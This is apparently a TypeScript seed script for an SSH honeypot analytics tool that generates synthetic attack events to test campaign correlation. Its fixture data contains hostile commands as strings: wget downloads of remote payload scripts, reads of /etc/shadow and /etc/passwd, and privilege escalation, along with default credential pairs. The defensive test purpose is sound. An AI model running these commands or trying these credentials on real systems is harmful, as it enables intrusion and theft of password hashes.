/**
 * Seed synthetic ENRICHED events (no LLM) to exercise correlation + reporting
 * without spending Gemini quota. Writes data/enriched.jsonl.
 *
 * Timestamps spread across the last 24h so the dashboard chart is meaningful,
 * while each campaign's own events stay inside the 30-minute correlation
 * window. Usage: npx tsx scripts/seed-enriched.ts
 */
import "dotenv/config";
import { mkdirSync, writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";
import { EnrichedEventSchema } from "../src/mastra/schemas";

const t0 = Date.now();
/** offsetMin = minutes before now. */
const iso = (offsetMin: number) =>
  new Date(t0 - offsetMin * 60_000).toISOString();

type Geo = { country: string; city: string; asnOrg: string };

function evt(
  sourceIp: string,
  offsetMin: number,
  username: string,
  password: string,
  commands: string[],
  classification: string,
  severity: number,
  reasoning: string,
  geo?: Geo,
) {
  return EnrichedEventSchema.parse({
    id: randomUUID(),
    timestamp: iso(offsetMin),
    sourceIp,
    sourcePort: 40000 + Math.floor(Math.random() * 20000),
    service: "ssh",
    usernameTried: username,
    passwordTried: password,
    commandsAttempted: commands,
    sessionDurationMs: 500 + Math.floor(Math.random() * 3000),
    raw: { clientVersion: "SSH-2.0-OpenSSH_9.2p1" },
    classification,
    severity,
    reasoning,
    geo,
    enrichmentWarnings: geo ? [] : ["geo lookup unavailable"],
  });
}

const NL: Geo = {
  country: "Netherlands",
  city: "Amsterdam",
  asnOrg: "AS64512 — Example Transit BV",
};
const BR: Geo = {
  country: "Brazil",
  city: "São Paulo",
  asnOrg: "AS64513 — Example Net",
};
const DE: Geo = {
  country: "Germany",
  city: "Frankfurt",
  asnOrg: "AS64514 — Example Hosting",
};

// Headline campaign: one IP escalating from credential stuffing to active
// exploitation over ~25 minutes. Every gap stays inside the 30-minute window,
// so this must collapse into exactly ONE campaign and trigger a report (FR6).
const headline = [
  evt("198.51.100.23", 26, "root", "toor", ["whoami"], "credential_stuffing", 3, "Default root credential attempted."),
  evt("198.51.100.23", 24, "root", "admin", ["whoami", "uname -a"], "recon", 3, "System enumeration after login."),
  evt("198.51.100.23", 21, "admin", "admin123", ["ls", "cat /etc/passwd"], "recon", 3, "Browsing system accounts."),
  evt("198.51.100.23", 17, "admin", "admin123", ["sudo su"], "active_exploit_attempt", 4, "Attempting privilege escalation.", NL),
  evt("198.51.100.23", 11, "admin", "admin123", ["cat /etc/shadow"], "active_exploit_attempt", 5, "Reading password hashes.", NL),
  evt("198.51.100.23", 4, "admin", "admin123", ["wget http://198.51.100.23/p.sh"], "active_exploit_attempt", 5, "Downloading a remote payload.", NL),
];

// Background traffic scattered across the day, mostly low severity.
const noise: Array<
  [number, string, string, string, string[], string, number, string, Geo | undefined]
> = [
  [1435, "45.142.212.61", "root", "root", [], "noise", 1, "Bare connection, no payload.", undefined],
  [1310, "91.240.118.9", "admin", "123456", ["ls"], "credential_stuffing", 2, "Common default password.", DE],
  [1180, "185.220.101.4", "root", "xc3511", ["uname -a"], "recon", 2, "Kernel version probe.", DE],
  [1015, "103.27.186.77", "pi", "raspberry", ["ls", "whoami"], "recon", 2, "Default IoT credential.", undefined],
  [890, "77.83.36.12", "test", "test", [], "noise", 1, "Scanner handshake, no auth payload.", undefined],
  [742, "45.142.212.61", "root", "admin", ["cat /etc/passwd"], "recon", 3, "Account file enumeration.", undefined],
  [655, "193.32.162.19", "ubuntu", "ubuntu", ["whoami", "ps aux"], "recon", 2, "Process listing.", BR],
  [520, "91.240.118.9", "admin", "password", ["wget http://91.240.118.9/a.sh"], "active_exploit_attempt", 4, "Remote payload download.", DE],
  [430, "185.220.101.4", "guest", "guest", ["ls"], "noise", 1, "Default guest login.", undefined],
  [318, "103.27.186.77", "root", "admin123", ["cat /etc/shadow"], "active_exploit_attempt", 4, "Password hash access.", undefined],
  [240, "45.142.212.61", "root", "toor", ["sudo su", "ls"], "active_exploit_attempt", 4, "Privilege escalation attempt.", undefined],
  [165, "193.32.162.19", "oracle", "welcome1", ["ls"], "recon", 2, "Shallow directory listing.", BR],
  [95, "77.83.36.12", "oracle", "oracle", ["uname -a"], "recon", 2, "Kernel version probe.", BR],
  // Same IP as the headline campaign but 75 minutes after its first event, so
  // the gap exceeds the 30-minute window and it must NOT merge into that
  // campaign. (At 52 minutes the gap was only 26 and merging was correct.)
  [75, "198.51.100.23", "root", "toor", ["whoami"], "credential_stuffing", 3, "Same IP returning much later; a separate campaign.", undefined],
];

const all = [
  ...headline,
  ...noise.map(([m, ip, u, p, c, cls, sev, why, geo]) =>
    evt(ip, m, u, p, c, cls, sev, why, geo),
  ),
];

mkdirSync("data", { recursive: true });
writeFileSync(
  "data/enriched.jsonl",
  all.map((e) => JSON.stringify(e)).join("\n") + "\n",
);
console.log(`Seeded ${all.length} enriched events into data/enriched.jsonl (spanning 24h)`);
console.log("  198.51.100.23 x6  (all gaps <30min, max sev 5) -> 1 campaign + report");
console.log("  same IP again 75m later                       -> a separate campaign");
console.log("  14 background events across 4 other IPs");
